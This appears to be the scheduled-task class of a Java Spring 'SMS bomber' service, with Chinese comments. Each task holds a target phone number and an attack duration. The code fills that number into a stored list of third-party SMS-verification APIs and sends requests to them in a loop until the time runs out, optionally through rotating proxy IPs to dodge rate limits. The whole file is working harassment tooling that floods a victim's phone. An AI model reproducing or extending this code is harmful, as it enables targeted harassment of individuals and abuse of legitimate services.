package com.llmoe.bomb.task;

import cn.hutool.core.convert.Convert;
import cn.hutool.core.date.DateTime;
import cn.hutool.core.date.DateUtil;
import cn.hutool.core.lang.Console;
import cn.hutool.core.util.StrUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.llmoe.bomb.common.Constant;
import com.llmoe.bomb.entity.ApiInterface;
import com.llmoe.bomb.entity.BombTask;
import com.llmoe.bomb.entity.Config;
import com.llmoe.bomb.service.ApiInterfaceService;
import com.llmoe.bomb.service.BombTaskService;
import com.llmoe.bomb.service.ConfigService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.List;
import java.util.Map;

/**
 * 轰炸定时任务
 *
 * @author llmoe
 * @date 2020/04/011
 */
@Component("bomTask")
@Configuration
@EnableScheduling //开启基于注解的定时任务
public class BombTasks {

    /**
     * 轰炸任务
     */
    @Autowired
    private BombTaskService bombTaskService;

    /**
     * 网站配置
     */
    @Autowired
    private ConfigService configService;

    /**
     * APi接口
     */
    @Autowired
    private ApiInterfaceService apiInterfaceService;


    /**
     * 5分钟执行一次 300秒
     * 定时执行方法
     */
    @Scheduled(fixedRate = 300 * 1000)
    @Async
    public void bombTasks() {
        System.err.println("执行轰炸任务: " + new DateTime());

        //更新任务状态
        bombTaskService.updateTaskStatus();

        //获取最大并行任务
        Config config = configService.getOne(new QueryWrapper<Config>().eq("`key`", "max_task"));
        int maxTask = Convert.toInt(config.getValue());
        //获取正在进行中的攻击 0 未开始 1 进行中 2 已完成
        int attackNum = bombTaskService.count(new QueryWrapper<BombTask>().eq("is_attack", 1));

        //如果最大并行任务大于 正在进行中任务 退出去
        if (attackNum > maxTask) {
            return;
        }

        //获取全部有效API轰炸接口
        List<ApiInterface> apiList = apiInterfaceService.list(new QueryWrapper<ApiInterface>().eq("status", 1));

        Config proxyApi = configService.getOne(new QueryWrapper<Config>().eq("`key`", "proxy_api"));

        //获取未开始的任务
        List<BombTask> taskList = bombTaskService.list(new QueryWrapper<BombTask>().eq("is_attack", 0));
        for (BombTask task : taskList) {
            //状态改为正在进行中
            task.setIsAttack(1);
            //设置开始时间
            task.setStartTime(new DateTime());
            bombTaskService.updateById(task);
            this.send(apiList, task.getPhone(), task.getAttackTime(), task.getId(), proxyApi.getValue());

            //实时获取进行中任务数量
            attackNum = bombTaskService.count(new QueryWrapper<BombTask>().eq("is_attack", 1));

            if (attackNum >= maxTask) {
                return;
            }
        }
    }


    /**
     * 发送短信List
     *
     * @param anInterface APi 接口
     * @param phone       手机号码
     * @param attackTime  攻击时间(分钟)
     * @param proxyApi    代理PAI
     * @param taskId      任务ID
     */
    @Async
    public void send(List<ApiInterface> anInterface, String phone, Integer attackTime, Integer taskId, String proxyApi) {
        //开始时间
        long startTime = DateUtil.currentSeconds();
        long endTime = 0;
        do {
            System.out.println("一个循环");
            for (ApiInterface api : anInterface) {
                try {
                    sendAsync(api, phone, proxyApi);
                } catch (Exception e) {
                    Console.error(e.getMessage());
                }
                endTime = DateUtil.currentSeconds();
                if (!taskStatus(endTime, startTime, attackTime, taskId)) {
                    return;
                }
            }
        } while (taskStatus(endTime, startTime, attackTime, taskId));
    }


    /**
     * 发送短信 //没有弄多线程。。因为速度太快会boom
     *
     * @param api      APi 接口
     * @param phone    手机号码
     * @param proxyApi 代理IP 接口
     */
    public void sendAsync(ApiInterface api, String phone, String proxyApi) {

        //请求接口 替换用户手机号
        api.setUrl(StrUtil.replace(api.getUrl(), "target_Phone", phone));

        Console.log("请求接口：" + api.getUrl());

        //请求参数 替换用户手机号
        api.setParm(StrUtil.replace(api.getParm(), "target_Phone", phone));

        Console.log("请求参数：" + api.getParm());

        //构建HTTP请求
        HttpRequest httpRequest = null;


        //0 GET 1 POST
        if (Constant.HTTP_GET.equals(api.getType())) {
            httpRequest = HttpRequest.get(api.getUrl());
        } else {
            httpRequest = HttpRequest.post(api.getUrl());
        }

        //如果头不为空 并且为JSON字符串
        if (StrUtil.isNotBlank(api.getHeaders()) && JSONUtil.isJson(api.getHeaders())) {
            Map map = JSONUtil.parseObj(api.getHeaders());
            httpRequest.addHeaders(map);
        } else {
            httpRequest.header(Header.USER_AGENT, "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0");
            httpRequest.header(Header.ACCEPT_ENCODING, "gzip, deflate, br");
            httpRequest.header(Header.ACCEPT_LANGUAGE, "zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2");
            httpRequest.header(Header.CACHE_CONTROL, "max-age=0");
        }

        //如果Cookie不为空
        if (StrUtil.isNotBlank(api.getCookie())) {
            httpRequest.cookie(api.getCookie());
        }

        //如果请求参数不为空
        if (StrUtil.isNotBlank(api.getParm())) {
            httpRequest.body(api.getParm());
        }

        //代理API不为空
        if (StrUtil.isNotBlank(proxyApi)) {
            //获取代理IP
            String proxyIp = HttpUtil.get(proxyApi);
            System.out.println("proxyIp = " + proxyIp);
            String[] ip = this.getIp(proxyIp);
            if (ip != null) {
                System.out.println(ip[0] + ip[1]);
                httpRequest.setProxy(new Proxy(Proxy.Type.HTTP, InetSocketAddress.createUnresolved(ip[0], Convert.toInt(ip[1]))));
            }
        }

        HttpResponse response = httpRequest.timeout(Constant.HTTP_TIME_OUT).execute();

        Console.log("响应内容：" + response.body());
    }

    /**
     * 判断任务是否完成
     *
     * @param endTime    结束时间
     * @param startTime  开始时间
     * @param attackTime 轰炸时间
     * @param taskId     任务ID
     * @return 结果
     */
    public boolean taskStatus(long endTime, long startTime, Integer attackTime, Integer taskId) {
        if ((endTime - startTime) / 60 < attackTime) {
            return true;
        } else {
            BombTask task = new BombTask();
            task.setId(taskId);
            task.setIsAttack(2);
            bombTaskService.updateById(task);
            return false;
        }
    }


    /**
     * 处理获取到的代理IP
     *
     * @param ip 代理IP
     * @return 结果
     */
    public String[] getIp(String ip) {
        String[] split = StrUtil.splitToArray(ip, ':');
        if (split.length != 2) {
            return null;
        }
        return split;
    }

}
